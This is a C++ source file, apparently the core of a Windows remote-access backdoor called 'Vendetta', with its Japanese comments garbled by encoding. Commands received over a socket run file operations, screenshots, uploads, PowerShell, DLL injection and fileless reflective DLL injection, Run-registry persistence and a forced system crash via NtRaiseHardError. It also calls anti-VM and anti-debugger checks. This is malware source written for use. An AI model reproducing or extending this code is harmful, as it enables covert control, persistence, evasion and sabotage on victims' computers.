#include "Vendetta.h"

// �O���[�o���ϐ���`
SOCKET mainSocket;

std::set<std::string> helpOptions = { "-h", "h", "help", "-help", "--help" };
const std::string newline = "\r\n";

// �R�}���h�ƑΉ�����֐��̃}�b�v
std::map<std::string, CommandFunction> commandMap = {
    {"mb", ShowMessageBox},
    {"upload", UploadFile},
    {"ls", Dir},
    {"cd",Cd},
    {"cat",Cat},
    {"mkdir",MkDir},
    {"rmdir",Rmdir},
    {"pwd", Pwd},
    {"cp", Copy},
    {"mv", Move},
    {"touch", Touch},
    {"write", Write},
    {"ps", ProcessList},
    {"help", Help},
    {"h", Help },
    {"rm", Remove },
    {"netstat", Netstat },
    {"screenshot",ScreenShot },
    {"dllinject" ,DllInjection},
    {"frefinject",FilelessReflectiveDLLInjection},
    {"systemcrash",SystemCrash},
    {"runreg", RunRegistry},
    {"pwsh", RunPowerShellCommand},
    {"kill", TerminateProcess},
    {"createprocess", CreateNewProcess}
};




// help�R�}���h
void Help(std::vector<std::string>& tokens) {
    // �񕝂̒�`
    const int commandWidth = 40;
    const int descriptionWidth = 80;

    std::ostringstream helpText;

    // �R�}���h�Ɛ����̃y�A���`
    struct CommandHelp {
        std::string command;
        std::string description;
    };

    // ���C���R�}���h �Z�N�V����
    helpText << "�W���R�}���h\n"
        << "==============\n\n"
        << std::left << std::setw(commandWidth) << "Command"
        << "Description\n"
        << std::setw(commandWidth) << "-------"
        << "-----------\n";

    std::vector<CommandHelp> commands = {
        {"help", "�R�}���h�w���v��\��"},
        {"netstat", "�l�b�g���[�N�ڑ��̈ꗗ��\��"},
        {"ps", "���s���̃v���Z�X�ꗗ��\��"},
        {"kill", "�w�肵��PID�̃v���Z�X���I��"},
        {"pwd", "���݂̍�ƃf�B���N�g����\��"},
        {"cd", "��ƃf�B���N�g����ύX"},
        {"ls", "�t�@�C���ƃf�B���N�g���̈ꗗ��\��"},
        {"cat", "�t�@�C���̓��e��\��"},
        {"mkdir", "�V�����f�B���N�g�����쐬"},
        {"rm", "�t�@�C���܂��̓f�B���N�g�����폜"},
        {"cp", "�t�@�C���܂��̓f�B���N�g�����R�s�["},
        {"mv", "�t�@�C���܂��̓f�B���N�g�����ړ�"},
        {"createprocess", "�V�K�v���Z�X�쐬"},
        {"pwsh", "powershell�R�}���h�Ăяo��"},
        {"screenshot", "�X�N�V���B�e"},
        {"upload", "�t�@�C�����A�b�v���[�h"},
        {"mb", "���b�Z�[�W�{�b�N�X��\��"},
        {"touch", "�t�@�C�����쐬"},
        {"write", "�t�@�C���ɏ�������"}
    };

    // �R�}���h�����Ԃɕ\��
    for (const auto& cmd : commands) {
        helpText << std::left
            << std::setw(commandWidth) << cmd.command
            << cmd.description << "\n";
    }



    helpText << "\n�v���Z�X�C���W�F�N�V����\n"
        << "=======================\n\n"
        << std::left << std::setw(commandWidth) << "Command"
        << "Description\n"
        << std::setw(commandWidth) << "-------"
        << "-----------\n";

    std::vector<CommandHelp> processInjectionCommands = {
        {"dlliject", "DLL�C���W�F�N�V���������s"},
        {"flrefinject", "�t�@�C�����X�Ŕ��ˌ^DLL�C���W�F�N�V���������s"},
    };

    for (const auto& cmd : processInjectionCommands) {
        helpText << std::left
            << std::setw(commandWidth) << cmd.command
            << cmd.description << "\n";
    }




    helpText << "\n���������J�j�Y���i�o�b�N�h�A�j\n"
        << "================\n\n"
        << std::left << std::setw(commandWidth) << "Command"
        << "Description\n"
        << std::setw(commandWidth) << "-------"
        << "-----------\n";

    std::vector<CommandHelp> backdoorCommands = {
        {"runreg", "RunRegistry�Ŏ��������J�j�Y��"},
    };

    for (const auto& cmd : backdoorCommands) {
        helpText << std::left
            << std::setw(commandWidth) << cmd.command
            << cmd.description << "\n";
    }





    helpText << "\n���̑�\n"
        << "================\n\n"
        << std::left << std::setw(commandWidth) << "Command"
        << "Description\n"
        << std::setw(commandWidth) << "-------"
        << "-----------\n";

    std::vector<CommandHelp> mayhemCommands = {
        {"systemcrash", "�댯: NtRaiseHardError�𒼐ڌĂяo���ăV�X�e���N���b�V��"},

    };

    for (const auto& cmd : mayhemCommands) {
        helpText << std::left
            << std::setw(commandWidth) << cmd.command
            << cmd.description << "\n";
    }



    SendString(helpText.str());
}




// string����wstring�ւ̕ϊ�
std::wstring ConvertToWString(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), &wstr[0], size_needed);
    return wstr;
}

// wstring����string�ւ̕ϊ�
std::string convertToString(const std::wstring& wstr) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.size()), NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.size()), &str[0], size_needed, NULL, NULL);
    return str;
}

// ���b�Z�[�W�𑗐M
void SendString(const std::string& message) {
    std::string msg = message + "\n";
    int totalSent = 0;
    int msgLength = static_cast<int>(msg.size());

    while (totalSent < msgLength) {
        int bytesSent = send(mainSocket, msg.c_str() + totalSent, msgLength - totalSent, 0);
        if (bytesSent == SOCKET_ERROR) {
            closesocket(mainSocket);
            return;
        }
        totalSent += bytesSent;
    }
}

// �R�}���h�̓��e���g�[�N���ɕ���
std::vector<std::string> ParseCommand(const std::string& input) {
    std::vector<std::string> tokens;
    std::stringstream stream(input);
    std::string token;

    while (stream >> token) {
        tokens.push_back(token);
    }
    return tokens;
}

// �����_��������𐶐�
std::string generateRandomFileName() {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::string result;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(charset) - 2);

    for (int i = 0; i < 16; ++i) {
        result += charset[dis(gen)];
    }
    return result;
}

// �R�}���h�����s
void ExecuteCommand(std::vector<std::string>& tokens) {
    if (!tokens.empty()) {
        std::string command = tokens[0];
        auto it = commandMap.find(command);
        if (it != commandMap.end()) {
            it->second(tokens);
        }
        else {
            return;
        }
    }
}

// �V�F���̌������m�F
bool IsUserAnAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup);
    CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
    return isAdmin == TRUE;
}

// ���݂̃��[�U�[�����擾
std::string GetCurrentUsername() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username, &username_len)) {
        return std::string(username);
    }
    else {
        return "";
    }
}

// �J�����g�f�B���N�g���𑗐M
void SendPrompt(SOCKET mainSocket) {
    const DWORD bufferSize = MAX_PATH;
    char currentDir[bufferSize];

    DWORD result = GetCurrentDirectoryA(bufferSize, currentDir);
    if (result > 0 && result < bufferSize) {
        std::string username = GetCurrentUsername(); // ���[�U�[�����擾
        bool isAdmin = IsUserAnAdmin(); // �����̊m�F
        std::string adminIndicator = isAdmin ? "Administrator" : "User";

        // �v�����v�g�`���̍\�z
        std::string message = "\n������(" + username + "@" + adminIndicator + ")-[" + currentDir + "]\n" + "����" + (isAdmin ? "Vendetta #" : "Vendetta $ ");
        send(mainSocket, message.c_str(), static_cast<int>(message.size()), 0);
    }
    else {
        exit(1);
    }
}

void AntiVM() {
    CheckRegistry();
    CheckBIOS();
    CheckProcesses();
    CheckDrivers();
}

void AntiDbg() {
    IsDebuggerPresentByAPI();
    CheckRemoteDebugger();
    NtGlobalFlagByPEB();
    WindowNameBlock();
    IsProcessRunning();
}